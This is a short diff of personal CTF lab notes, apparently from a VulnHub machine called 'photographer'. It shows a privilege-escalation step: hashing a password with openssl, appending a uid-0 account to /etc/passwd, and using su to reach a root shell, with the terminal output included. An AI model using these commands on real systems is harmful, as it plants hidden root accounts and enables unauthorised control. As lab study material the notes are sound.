@@ -1,0 +1,22 @@
+using openssl genrate the password
+┌─[root@saims0n] - [~/Desktop/Notes/HTB-NOTES/vulnhub] - [10529]
+└─[$] openssl passwd saimson                                                                                                               [19:09:44]
+UwDRjSjKqJx2w
+
+since our euid is 0 we can edit passwd...
+add a user saimson paswword saimson with uid and eid =0
+
+echo "saimson:UwDRjSjKqJx2w:0:0:root:/root:/bin/bash">>/etc/passwd
+
+bash-4.3# cat /etc/passwd
+
+saimson:UwDRjSjKqJx2w:0:0:root:/root:/bin/bash
+
+now we can switch to the user saimson to scape the shell....
+
+bash-4.3# su saimson
+Password: 
+root@photographer:/var/www# id
+uid=0(root) gid=0(root) groups=0(root)
+root@photographer:/var/www# 
+
